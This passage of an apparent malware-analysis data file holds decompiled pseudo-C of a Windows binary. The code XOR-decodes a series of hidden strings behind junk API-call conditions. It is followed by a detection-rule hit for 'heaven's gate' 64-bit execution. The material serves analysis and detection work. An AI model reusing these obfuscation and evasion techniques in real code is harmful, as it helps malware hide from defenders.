0x10;\n    var_10h._0_1_ = 0x34;\n    var_10h._1_1_ = 0xd;\n    var_10h._2_1_ = 0x14;\n    var_10h._3_1_ = 0x20;\n    var_ch._0_1_ = 0x3c;\n    var_ch._1_1_ = 0x16;\n    var_ch._2_1_ = 0x11;\n    var_ch._3_1_ = 0xb;\n    var_8h._0_1_ = 0x19;\n    var_8h._1_1_ = 0x39;\n    var_8h._2_1_ = 0x22;\n    var_8h._3_1_ = 0x14;\n    var_4h._0_1_ = 0x24;\n    var_4h._1_1_ = 0x1e;\n    var_4h._2_1_ = 0x15;\n    var_4h._3_1_ = 0x4f;\n    var_ech = 0x784b4f70;\n    var_e8h._0_2_ = 0x7941;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_134h = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar6 != 0x2af717) {\n            *(iVar5 + iVar7) = *(&var_ech + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x14);\n    fcn.0040cda0();\n    var_14h._0_1_ = 0x34;\n    var_14h._1_1_ = 0x3c;\n    var_14h._2_1_ = 9;\n    var_14h._3_1_ = 0x56;\n    var_10h._0_1_ = 0x50;\n    var_10h._1_1_ = 0x12;\n    var_10h._2_1_ = 0x3e;\n    var_10h._3_1_ = 0x1d;\n    var_ch._0_1_ = 0x41;\n    var_ch._1_1_ = 0x5b;\n    var_ch._2_1_ = 0x11;\n    var_ch._3_1_ = 0x30;\n    var_8h._0_1_ = 0x21;\n    var_8h._1_1_ = 0x56;\n    var_8h._2_1_ = 0x55;\n    var_8h._3_1_ = 2;\n    var_4h._0_1_ = 0x59;\n    var_a4h = 0x334d5967;\n    var_a0h._0_1_ = 0x32;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_ech = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar6 != 0xb7672) {\n            *(iVar5 + iVar7) = *(&var_a4h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x11);\n    fcn.0040cda0();\n    var_14h._0_1_ = 9;\n    var_14h._1_1_ = 0xc;\n    var_14h._2_1_ = 0x2e;\n    var_14h._3_1_ = 0x45;\n    var_10h._0_1_ = 0x34;\n    var_10h._1_1_ = 0x3e;\n    var_10h._2_1_ = 0x2e;\n    var_10h._3_1_ = 0x39;\n    var_ch._0_1_ = 0x1d;\n    var_ch._1_1_ = 0x59;\n    var_ch._2_1_ = 0x26;\n    var_ch._3_1_ = 0x3e;\n    var_8h._0_1_ = 0x36;\n    var_8h._1_1_ = 0xc;\n    var_8h._2_1_ = 8;\n    var_8h._3_1_ = 0x55;\n    var_4h._0_1_ = 0x50;\n    var_e4h = 0x306f695a;\n    var_e0h._0_2_ = 0x5750;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_a4h = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar6 != 0x2e96f2) {\n            *(iVar5 + iVar7) = *(&var_e4h + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x11);\n    fcn.0040cda0();\n    var_20h = 0x20322865;\n    var_1ch._0_1_ = 0x40;\n    var_1ch._1_1_ = 0x42;\n    var_1ch._2_1_ = 0x28;\n    var_1ch._3_1_ = 0xc;\n    var_18h._0_1_ = 0x1c;\n    var_18h._1_1_ = 0x5d;\n    var_18h._2_1_ = 0x40;\n    var_18h._3_1_ = 0x24;\n    var_14h._0_1_ = 0x13;\n    var_14h._1_1_ = 0x36;\n    var_14h._2_1_ = 0x5d;\n    var_14h._3_1_ = 0x5b;\n    var_10h._0_1_ = 0x28;\n    var_10h._1_1_ = 0xf;\n    var_10h._2_1_ = 0x2d;\n    var_10h._3_1_ = 99;\n    var_ch._0_1_ = 0x44;\n    var_ch._1_1_ = 0x24;\n    var_ch._2_1_ = 0x17;\n    var_ch._3_1_ = 0x30;\n    var_8h._0_1_ = 0x5f;\n    var_8h._1_1_ = 0x53;\n    var_8h._2_1_ = 0x2a;\n    var_8h._3_1_ = 4;\n    var_4h._0_1_ = 0x59;\n    var_94h = 0x59614d36;\n    var_90h._0_1_ = 0x33;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1e);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_e4h = iVar7;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar6 != 0xb40c9e) {\n            *(iVar5 + iVar7) = *(&var_94h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1d);\n    fcn.0040cda0();\n    var_18h._0_1_ = 0xb;\n    var_18h._1_1_ = 0x11;\n    var_18h._2_1_ = 1;\n    var_18h._3_1_ = 0x1d;\n    var_14h._0_1_ = 0x20;\n    var_14h._1_1_ = 0x36;\n    var_14h._2_1_ = 0x13;\n    var_14h._3_1_ = 0x27;\n    var_10h._0_1_ = 0x3b;\n    var_10h._1_1_ = 0x2e;\n    var_10h._2_1_ = 0x2c;\n    var_10h._3_1_ = 0x1d;\n    var_ch._0_1_ = 0x24;\n    var_ch._1_1_ = 0xc;\n    var_ch._2_1_ = 0x11;\n    var_ch._3_1_ = 0x2a;\n    var_8h._0_1_ = 0x1d;\n    var_8h._1_1_ = 0x34;\n    var_8h._2_1_ = 0x1c;\n    var_8h._3_1_ = 0x2d;\n    var_4h._0_1_ = 0x3d;\n    var_4h._1_1_ = 0x13;\n    var_4h._2_1_ = 0x27;\n    var_4h._3_1_ = 0x75;\n    var_8ch = 0x75427458;\n    var_88h._0_1_ = 0x41;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_94h = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar6 != 0x423e97) {\n            *(iVar5 + iVar7) = *(&var_8ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x18);\n    fcn.0040cda0();\n    var_1ch._0_1_ = 0x25;\n    var_1ch._1_1_ = 0x14;\n    var_1ch._2_1_ = 0x17;\n    var_1ch._3_1_ = 0x55;\n    var_18h._0_1_ = 0x3f;\n    var_18h._1_1_ = 0x19;\n    var_18h._2_1_ = 5;\n    var_18h._3_1_ = 0x20;\n    var_14h._0_1_ = 99;\n    var_14h._1_1_ = 0x3a;\n    var_14h._2_1_ = 3;\n    var_10h._0_1_ = 0x21;\n    var_10h._1_1_ = 0x5f;\n    var_10h._2_1_ = 0x25;\n    var_10h._3_1_ = 0x18;\n    var_ch._0_1_ = 0x21;\n    var_ch._1_1_ = 0x37;\n    var_ch._2_1_ = 0x59;\n    var_ch._3_1_ = 0x24;\n    var_8h._0_1_ = 0x1f;\n    var_8h._1_1_ = 0x1d;\n    var_8h._2_1_ = 0x20;\n    var_8h._3_1_ = 0x57;\n    var_4h._0_1_ = 0x37;\n    var_4h._1_1_ = 0x76;\n    var_84h = 0x30457176;\n    var_80h._0_1_ = 0x52;\n    var_14h._3_1_ = var_18h._2_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_8ch = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar6 != 0x5796fa) {\n            *(iVar5 + iVar7) = *(&var_84h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1a);\n    fcn.0040cda0();\n    var_14h._0_1_ = 0x1c;\n    var_14h._1_1_ = 0x22;\n    var_14h._2_1_ = 0x16;\n    var_14h._3_1_ = 0x28;\n    var_10h._0_1_ = 0x52;\n    var_10h._1_1_ = 0x2e;\n    var_10h._2_1_ = 0x2c;\n    var_10h._3_1_ = 0x2c;\n    var_ch._0_1_ = 0x13;\n    var_ch._1_1_ = 0x34;\n    var_ch._2_1_ = 0x5f;\n    var_ch._3_1_ = 0x37;\n    var_8h._0_1_ = 0x26;\n    var_8h._1_1_ = 0x2b;\n    var_8h._2_1_ = 0x26;\n    var_8h._3_1_ = 0x21;\n    var_4h._0_1_ = 0x53;\n    var_4h._1_1_ = 0x41;\n    var_dch = 0x4643474f;\n    var_d8h._0_2_ = 0x4136;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_84h = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar6 != 0x70b9d0) {\n            *(iVar5 + iVar7) = *(&var_dch + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x12);\n    fcn.0040cda0();\n    var_18h._0_1_ = 0x22;\n    var_18h._1_1_ = 0x27;\n    var_18h._2_1_ = 0x1c;\n    var_18h._3_1_ = 0x17;\n    var_14h._0_1_ = 0x25;\n    var_14h._1_1_ = 1;\n    var_14h._2_1_ = 0x30;\n    var_14h._3_1_ = 0x25;\n    var_10h._0_1_ = 0x2a;\n    var_10h._1_1_ = 0;\n    var_10h._2_1_ = 0x3f;\n    var_10h._3_1_ = 0x32;\n    var_ch._0_1_ = 3;\n    var_ch._1_1_ = 0x2b;\n    var_ch._2_1_ = 0x39;\n    var_ch._3_1_ = 7;\n    var_8h._0_1_ = 0x27;\n    var_8h._1_1_ = 7;\n    var_8h._2_1_ = 0x16;\n    var_8h._3_1_ = 0x27;\n    var_4h._0_1_ = 0x4f;\n    var_d4h = 0x6e4f4271;\n    var_d0h._0_2_ = 0x624b;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_dch = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar6 != 0x8eda03) {\n            *(iVar5 + iVar7) = *(&var_d4h + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x15);\n    fcn.0040cda0();\n    var_1ch._0_1_ = 0x65;\n    var_1ch._1_1_ = 0x57;\n    var_1ch._2_1_ = 0x2b;\n    var_1ch._3_1_ = 0x37;\n    var_18h._0_1_ = 0x57;\n    var_18h._1_1_ = 0x54;\n    var_18h._2_1_ = 0x5e;\n    var_18h._3_1_ = 0xb;\n    var_14h._0_1_ = 0x1d;\n    var_14h._1_1_ = 0x53;\n    var_14h._2_1_ = 0x5a;\n    var_14h._3_1_ = 0x57;\n    var_10h._0_1_ = 9;\n    var_10h._1_1_ = 0x38;\n    var_10h._2_1_ = 0x42;\n    var_10h._3_1_ = 0x5f;\n    var_ch._0_1_ = 0x5d;\n    var_ch._1_1_ = 0;\n    var_ch._2_1_ = 9;\n    var_ch._3_1_ = 0x44;\n    var_8h._0_1_ = 0x5f;\n    var_8h._1_1_ = 0x44;\n    var_8h._2_1_ = 7;\n    var_8h._3_1_ = 0x35;\n    var_4h._0_1_ = 0x53;\n    var_4h._1_1_ = 0x51;\n    var_4h._2_1_ = 0x57;\n    var_4h._3_1_ = 0x6e;\n    var_6ch = 0x596e3236;\n    var_68h._0_1_ = 0x36;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_d4h = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar6 != 0xb7a25b) {\n            *(iVar5 + iVar7) = *(&var_6ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1c);\n    fcn.0040cda0();\n    var_18h._0_1_ = 0x10;\n    var_18h._1_1_ = 0x30;\n    var_18h._2_1_ = 0x26;\n    var_18h._3_1_ = 0x10;\n    var_14h._0_1_ = 0x56;\n    var_14h._1_1_ = 0x22;\n    var_14h._2_1_ = 0x32;\n    var_14h._3_1_ = 0xe;\n    var_10h._0_1_ = 0x27;\n    var_10h._1_1_ = 0x57;\n    var_10h._2_1_ = 0x2f;\n    var_10h._3_1_ = 0x20;\n    var_ch._0_1_ = 6;\n    var_ch._1_1_ = 0x14;\n    var_ch._2_1_ = 0x68;\n    var_ch._3_1_ = 0x31;\n    var_8h._0_1_ = 0x3c;\n    var_8h._1_1_ = 0x1d;\n    var_8h._2_1_ = 0x18;\n    var_8h._3_1_ = 0x54;\n    var_4h._0_1_ = 0x26;\n    var_4h._1_1_ = 0x32;\n    var_4h._2_1_ = 0xe;\n    var_4h._3_1_ = 0x71;\n    var_64h = 0x716b5543;\n    var_60h._0_1_ = 0x38;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_6ch = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar6 != 0x5c5fab) {\n            *(iVar5 + iVar7) = *(&var_64h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x18);\n    fcn.0040cda0();\n    var_18h._2_1_ = 5;\n    var_18h._0_1_ = 0x32;\n    var_18h._1_1_ = 0x52;\n    var_18h._3_1_ = 2;\n    var_14h._0_1_ = 0x20;\n    var_14h._1_1_ = 4;\n    var_14h._2_1_ = 0x45;\n    var_14h._3_1_ = 0x3f;\n    var_10h._0_1_ = 0;\n    var_10h._1_1_ = 0x3e;\n    var_10h._2_1_ = 0;\n    var_10h._3_1_ = 0x43;\n    var_ch._0_1_ = 0x29;\n    var_ch._1_1_ = 0x3f;\n    var_ch._2_1_ = 0x22;\n    var_ch._3_1_ = 8;\n    var_8h._0_1_ = 0x41;\n    var_8h._1_1_ = 0x25;\n    var_8h._2_1_ = 3;\n    var_8h._3_1_ = 0x35;\n    var_4h._0_1_ = 6;\n    var_4h._1_1_ = 0x52;\n    var_4h._2_1_ = 0x4c;\n    var_5ch = 0x6f4c3761;\n    var_58h._0_1_ = 0x50;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_64h = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar6 != 0x9466d6) {\n            *(iVar5 + iVar7) = *(&var_5ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x17);\n    fcn.0040cda0();\n    var_18h._0_1_ = 9;\n    var_18h._1_1_ = 0x31;\n    var_18h._2_1_ = 0x26;\n    var_18h._3_1_ = 0x35;\n    var_14h._0_1_ = 0x28;\n    var_14h._1_1_ = 0x3b;\n    var_14h._2_1_ = 0x20;\n    var_14h._3_1_ = 0;\n    var_10h._0_1_ = 0;\n    var_10h._1_1_ = 0x21;\n    var_10h._2_1_ = 0x35;\n    var_10h._3_1_ = 0x36;\n    var_ch._0_1_ = 4;\n    var_ch._1_1_ = 0x2b;\n    var_ch._2_1_ = 0x1d;\n    var_ch._3_1_ = 0x28;\n    var_8h._0_1_ = 0x3d;\n    var_8h._1_1_ = 0x13;\n    var_8h._2_1_ = 0x2e;\n    var_8h._3_1_ = 0x21;\n    var_4h._0_1_ = 0x3f;\n    var_4h._1_1_ = 0x33;\n    var_4h._2_1_ = 0;\n    var_4h._3_1_ = 0x47;\n    var_54h = 0x4765545a;\n    var_50h._0_1_ = 0x4d;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_5ch = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar6 != 0x63a5d6) {\n            *(iVar5 + iVar7) = *(&var_54h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x18);\n    fcn.0040cda0();\n    var_20h = 0x433b2300;\n    var_1ch._0_1_ = 0x1d;\n    var_1ch._1_1_ = 0x20;\n    var_1ch._2_1_ = 0x32;\n    var_1ch._3_1_ = 10;\n    var_18h._0_1_ = 0x55;\n    var_18h._1_1_ = 0x2b;\n    var_18h._2_1_ = 0x21;\n    var_18h._3_1_ = 0x23;\n    var_14h._0_1_ = 0xb;\n    var_14h._1_1_ = 0x7c;\n    var_14h._2_1_ = 9;\n    var_14h._3_1_ = 0x3d;\n    var_10h._0_1_ = 7;\n    var_10h._1_1_ = 0xc;\n    var_10h._2_1_ = 0x52;\n    var_10h._3_1_ = 0xd;\n    var_ch._0_1_ = 0x20;\n    var_ch._1_1_ = 0x35;\n    var_ch._2_1_ = 0x3f;\n    var_ch._3_1_ = 0x43;\n    var_8h._0_1_ = 1;\n    var_8h._1_1_ = 0x25;\n    var_8h._2_1_ = 0x2f;\n    var_8h._3_1_ = 3;\n    var_4h._0_1_ = 0x54;\n    var_4h._1_1_ = 0xf;\n    var_4h._2_1_ = 0x36;\n    var_4h._3_1_ = 0x46;\n    var_4ch = 0x316f4653;\n    var_48h._0_1_ = 0x68;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_54h = iVar7;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar6 != 0xb885de) {\n            *(iVar5 + iVar7) = *(&var_4ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x20);\n    fcn.0040cda0();\n    var_14h._0_1_ = 99;\n    var_14h._1_1_ = 0x1d;\n    var_14h._2_1_ = 0x13;\n    var_14h._3_1_ = 0x2f;\n    var_10h._0_1_ = 0x5a;\n    var_10h._1_1_ = 0xf;\n    var_10h._2_1_ = 0x52;\n    var_10h._3_1_ = 0x1d;\n    var_ch._0_1_ = 0x2d;\n    var_ch._1_1_ = 0x1a;\n    var_ch._2_1_ = 0x44;\n    var_ch._3_1_ = 7;\n    var_8h._0_1_ = 0x46;\n    var_8h._1_1_ = 0x11;\n    var_8h._2_1_ = 0x2d;\n    var_8h._3_1_ = 0x2f;\n    var_4h._0_1_ = 0x51;\n    var_4h._1_1_ = 0xb;\n    var_4h._2_1_ = 0x30;\n    var_cch = 0x4a417830;\n    var_c8h._0_2_ = 0x6e36;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_4ch = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar6 != 0x1876a6) {\n            *(iVar5 + iVar7) = *(&var_cch + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x13);\n    fcn.0040cda0();\n    var_20h = 0x362a5016;\n    var_1ch._0_1_ = 0x5a;\n    var_1ch._1_1_ = 0x34;\n    var_1ch._2_1_ = 0x20;\n    var_1ch._3_1_ = 0x54;\n    var_18h._0_1_ = 0x10;\n    var_18h._1_1_ = 0x3d;\n    var_18h._2_1_ = 0x6e;\n    var_18h._3_1_ = 0x29;\n    var_14h._0_1_ = 0x37;\n    var_14h._1_1_ = 0x5e;\n    var_14h._2_1_ = 10;\n    var_14h._3_1_ = 0x36;\n    var_10h._0_1_ = 0x5e;\n    var_10h._1_1_ = 0x15;\n    var_10h._2_1_ = 0x20;\n    var_10h._3_1_ = 0x41;\n    var_ch._0_1_ = 0x33;\n    var_ch._1_1_ = 0x2a;\n    var_ch._2_1_ = 0x50;\n    var_ch._3_1_ = 0x30;\n    var_8h._0_1_ = 0x2c;\n    var_8h._1_1_ = 0x59;\n    var_8h._2_1_ = 6;\n    var_8h._3_1_ = 0x3f;\n    var_4h._0_1_ = 0x5c;\n    var_4h._1_1_ = 0x46;\n    var_34h = 0x58633545;\n    var_30h._0_2_ = 0x4639;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_cch = iVar7;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar6 != 0xad8989) {\n            *(iVar5 + iVar7) = *(&var_34h + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1e);\n    fcn.0040cda0();\n    var_14h._0_1_ = 0xb;\n    var_14h._1_1_ = 0x56;\n    var_14h._2_1_ = 0x2d;\n    var_14h._3_1_ = 0x5c;\n    var_10h._0_1_ = 0x1d;\n    var_10h._1_1_ = 0x30;\n    var_10h._2_1_ = 2;\n    var_10h._3_1_ = 0x5c;\n    var_ch._0_1_ = 0x17;\n    var_ch._1_1_ = 0x50;\n    var_ch._2_1_ = 0x20;\n    var_ch._3_1_ = 0x27;\n    var_8h._0_1_ = 0x31;\n    var_8h._1_1_ = 0x45;\n    var_8h._2_1_ = 0x10;\n    var_8h._3_1_ = 0x59;\n    var_4h._0_1_ = 0x15;\n    var_4h._1_1_ = 0x32;\n    var_4h._2_1_ = 0x3d;\n    var_4h._3_1_ = 0x33;\n    var_3ch = 0x35793358;\n    var_38h._0_2_ = 0x5570;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_34h = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar6 != 0xe9425f) {\n            *(iVar5 + iVar7) = *(&var_3ch + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x14);\n    fcn.0040cda0();\n    var_20h = 0x102a5d1c;\n    var_1ch._0_1_ = 0x30;\n    var_1ch._1_1_ = 0x54;\n    var_1ch._2_1_ = 0x3b;\n    var_1ch._3_1_ = 0x5d;\n    var_18h._0_1_ = 0x3a;\n    var_18h._1_1_ = 0x1b;\n    var_18h._2_1_ = 0x38;\n    var_18h._3_1_ = 0x57;\n    var_14h._0_1_ = 0x20;\n    var_14h._1_1_ = 0x54;\n    var_14h._2_1_ = 0;\n    var_14h._3_1_ = 1;\n    var_10h._0_1_ = 0x19;\n    var_10h._1_1_ = 0x5c;\n    var_10h._2_1_ = 0x21;\n    var_10h._3_1_ = 0x53;\n    var_ch._0_1_ = 0x39;\n    var_ch._1_1_ = 0x10;\n    var_ch._2_1_ = 0x3c;\n    var_ch._3_1_ = 0x43;\n    var_8h._0_1_ = 0x26;\n    var_8h._1_1_ = 0x54;\n    var_8h._2_1_ = 0xc;\n    var_8h._3_1_ = 5;\n    var_4h._0_1_ = 0x30;\n    var_4h._1_1_ = 0x35;\n    var_3ch = 0x6269384f;\n    var_38h._0_2_ = 0x3555;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar6 != 0x36db) {\n            *(iVar5 + iVar7) = *(&var_3ch + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1e);\n    fcn.0040cda0();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, var_34h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_cch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_4ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_54h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_5ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_64h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_6ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_d4h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_dch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_84h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_8ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_94h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_e4h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_a4h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_ech);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_134h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_bch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_b4h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_13ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_c4h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_fch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_12ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_44h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_104h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_74h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_f4h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_7ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_9ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_10ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_114h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_11ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_124h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_ach);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar4);\n    (*pcVar1)(uVar3);\n    return;\n}\n",
        "token_count": 21898
    },
    "0040ad3b": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
